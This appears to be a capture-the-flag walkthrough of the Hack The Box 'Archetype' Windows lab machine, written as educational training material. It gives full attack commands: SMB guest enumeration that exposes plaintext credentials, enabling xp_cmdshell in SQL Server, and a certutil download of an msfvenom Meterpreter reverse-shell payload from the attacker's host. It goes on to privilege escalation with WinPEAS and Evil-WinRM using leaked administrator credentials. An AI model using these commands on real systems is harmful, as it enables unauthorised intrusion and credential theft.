# Introduction

As part of the `Starting Point Tier 2` series on Hack The Box, `Archetype` is a Windows-based machine designed to introduce beginners to fundamental enumeration and exploitation techniques in an Windows environment. Although it carries a Very Easy rating, it provides a great learning opportunity by requiring users to chain together different steps like SMB enumeration, SQL Server exploitation, and privilege escalation.

# Information Gathering

## Nmap Scan

The first step is to scan the target to identify open ports and services. Running a full `TCP SYN` scan across all ports gives us the initial overview.

```
sudo nmap -sS -p- -T5 10.129.188.82

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

This scan reveals common `Windows` service ports: `SMB (445)`, `MSRPC (135)`, `NetBIOS (139)`, `Microsoft SQL Server (1433)`, and `WinRM (5985 and 47001)`.

Next, to gather more detail about these services, a second scan runs with default scripts, version detection, and scanning specific ports:

```
sudo nmap -sS -sC -sV -p 135,139,445,1433,5985,47001 -T5 10.129.188.82
```

# Enumeration

### Port 445 – SMB

Nmap reveals that SMB is running on `Windows Server 2019 Standard`.

```
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h22m49s, deviation: 3h07m51s, median: -1m11s
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-29T07:16:32-07:00
| smb2-time: 
|   date: 2025-05-29T14:16:33
|_  start_date: N/
```

### Port 1433 – Microsoft SQL Server

On port `1433`, we find `Microsoft SQL Server 2017 running`.

```
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.188.82:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-05-29T14:16:40+00:00; -1m11s from scanner time.
| ms-sql-info: 
|   10.129.188.82:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-29T14:13:31
|_Not valid after:  2055-05-29T14:13:31
```

### Port 5985 and 47001 - WinRM

Both ports `5985` and `47001` show HTTP services running `Microsoft HTTPAPI 2.0`, typically used by WinRM for remote management,

```
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

## SMB Enumeration

From the Nmap scan, we observed that the SMB service on port `445` is running and, importantly, it allows guest access. This means we can connect without needing a password, which is often a potential vector to gather information. Using the `smbclient` tool, we list the shares accessible to the guest user.

```
smbclient -L 10.129.188.82 -U "guest"
Password for [WORKGROUP\guest]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```

The output shows several shares, including typical administrative shares like `ADMIN$` and `C$`, but also a share called `backups` that looks promising for further investigation. We connect to the `backups` share as `guest`.

```
smbclient \\\\10.129.188.82\\backups -U "guest"
Password for [WORKGROUP\guest]:
smb: \> dir
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020
```

Listing the directory inside this share reveals a configuration file. Inspecting the contents of `prod.dtsConfig`, we uncover connection details (probably to the Microsoft SQL Server), including a username and password in plain text.

```
cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration> 
```

# Exploitation

## Microsoft SQL Server Access and Exploitation

With the credentials discovered from the SMB share (`sql_svc` and password `M3g4c0rp123`), we attempt to connect to the Microsoft SQL Server running on port `1433`. Using the `mssqlclient.py` tool from Impacket, we connect with Windows authentication.

```
mssqlclient.py sql_svc@10.129.188.82 -windows-auth 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

After entering the password, the connection is successful, and we gain access to the SQL Server shell. At this point, we can interact with the database directly. First, we list the available databases to understand what data we might have access to.

```
SQL (ARCHETYPE\sql_svc  dbo@master)> select name from sys.databases

name     
------   
master   
tempdb   
model    
msdb     
```

The server hosts standard system databases like `master`, `tempdb`, `model`, and `msdb`. Though no user databases are immediately visible, having access to the SQL Server with this user is already a powerful position.

## Checking and Enabling `xp_cmdshell` for Command Execution

One powerful feature in Microsoft SQL Server is the extended stored procedure `xp_cmdshell`, which allows execution of arbitrary Windows commands directly through SQL queries. This can be a critical post-exploitation tool. First, let’s check if `xp_cmdshell` is enabled.

```
EXEC sp_configure 'show advanced options', 1;
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';
name          minimum   maximum   config_value   run_value   
-----------   -------   -------   ------------   ---------   
xp_cmdshell         0         1              0           0 
```

The output showed that both `config_value` and `run_value` for `xp_cmdshell` were set to 0, meaning the feature is currently disabled. Because our user seems to have sufficient privileges, we proceed to enable it.

```
EXEC sp_configure 'xp_cmdshell', 1;
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
RECONFIGURE;
```

After enabling it, we verify by running a simple Windows command via SQL.

```
EXEC xp_cmdshell 'ipconfig';

output                                                                  
---------------------------------------------------------------------   
NULL                                                                    
Windows IP Configuration                                                
NULL                                                                    
NULL                                                                    
Ethernet adapter Ethernet0 2:                                           
NULL                                                                    
   Connection-specific DNS Suffix  . : .htb                             
   IPv6 Address. . . . . . . . . . . : dead:beef::2d16:9938:27ad:bcca   
   Link-local IPv6 Address . . . . . : fe80::2d16:9938:27ad:bcca%7      
   IPv4 Address. . . . . . . . . . . : 10.129.188.82                    
   Subnet Mask . . . . . . . . . . . : 255.255.0.0                      
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe96:3c3f%7       
                                       10.129.0.1       
```

This returns the network configuration of the target machine, confirming that we can now execute system commands directly from the database. Now that we have command execution on the target via `xp_cmdshell`, we can proceed with gaining a reverse shell to establish a more interactive session.

## Gaining a Reverse Shell

The goal now is to transfer a payload to the target machine and execute it to gain a Meterpreter shell. First, on our attacker machine, we generate a Meterpreter reverse shell using `msfvenom`.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.249 LPORT=1234 -f exe > msf.exe
```

- `LHOST` is our attack box IP.
- `LPORT` is the port we'll listen on.
- `f exe` outputs a Windows executable.

We then serve this file using Python’s built-in HTTP server.

```
python3 -m http.server 80
```

This allows the target to download the payload directly from our machine. On our attacker machine, we set up Metasploit to catch the reverse shell using the `multi/handler` module.

```
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.249
set LPORT 1234
run
```

Back in the SQL shell, we start preparing the target. First, we create a writable `Temp` directory. 

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'mkdir C:\Temp';
```

Then, we use `certutil` (a built-in Windows utility) to download our malicious payload generated with `msfvenom`.

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.14.249/msf.exe C:\Temp\msf.exe';
```

Once downloaded, we list the directory to ensure the file is there.

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\Temp';
```

With the listener active, we can finally trigger the payload.

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'C:\Temp\msf.exe';
```

# Post Exploitation

Once the payload is executed, a Meterpreter session opens on the listener. We confirm access by running basic system info commands.

```
sysinfo
Computer        : ARCHETYPE
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows

getuid
Server username: ARCHETYPE\sql_svc
```

At this point, we're in as the `sql_svc` user. While it's not an admin account, it still has enough privileges for us to enumerate the system and start looking for sensitive files — like the user flag. One of the first places to check is the user’s Desktop, where CTF-style flags are often stored. In this case, we find the flag located at `C:\Users\sql_svc\desktop\user.txt`.

## Privilege Escalation – From `sql_svc` to Administrator

Now that we have a foothold on the system as the `sql_svc` user, our next goal is to escalate privileges to gain full administrative access.

### Enumerating the System with WinPEAS

To automate the discovery of privilege escalation paths, we upload `WinPEAS`, a well-known Windows enumeration script. We first transfer it to the victim machine using the `upload` command from our active meterpreter session.

```
upload winPEASx64.exe
```

Then, we open shell session on the victim and run the executable.

```
shell
winPEASx64.exe
```

`WinPEAS` performs a thorough scan of the system, checking for misconfigurations, stored credentials, scheduled tasks, services, and more.

### Discovering Credentials in PowerShell History

During the enumeration, `WinPEAS` draws our attention to a PowerShell command history file located at `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.

![image.png](attachment:0633b4ac-5608-4daa-a088-e56acc6e9b43:image.png)

We read the contents of this file. Inside, we find a command that includes sensitive credentials. 

```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

This tells us that the `Administrator` credentials are:

- Username: `administrator`.
- Password: `MEGACORP_4dm1n!!`.

These were likely left behind during administrative operations, and their presence in this history file gives us a direct path to privilege escalation.

### Accessing the System with Evil-WinRM

Now that we have the administrator credentials, we can establish a fully privileged session using `Evil-WinRM`, a tool that leverages the `Windows Remote Management (WinRM)` protocol.

```
evil-winrm -u administrator -p 'MEGACORP_4dm1n!!' -i 10.129.188.82
```

Once connected, we’re in as `Administrator` — the highest privilege level available on the machine. At this point, we have full control over the system.

![image.png](attachment:5d91e1d4-b376-4fce-a638-968b059c8b0e:image.png)

With administrator access, the final flag (`root.txt` or equivalent) can typically be found in the Administrator's Desktop or another secure location. 

![image.png](attachment:96e6a8d1-15ac-4791-9787-0217d411ad8c:image.png)

## Conclusion

This engagement successfully demonstrated the process of enumerating, exploiting, and ultimately gaining full administrative control over a `Windows Server 2019` host. The target system was compromised through a combination of insecure service configurations, weak credential management, and excessive permissions granted to service accounts.

The initial foothold was achieved via unauthenticated SMB access that allowed retrieval of sensitive configuration files. In particular, the `prod.dtsConfig` file revealed hardcoded SQL Server credentials, enabling us to authenticate directly to the Microsoft SQL Server instance exposed on port `1433`.

Once connected as the `ARCHETYPE\sql_svc` user, we observed that the account had sufficient privileges to enable and use the `xp_cmdshell` feature, which allowed direct execution of system commands from within SQL queries. Using this method, we uploaded and executed a Meterpreter payload, establishing a remote session as `sql_svc`.
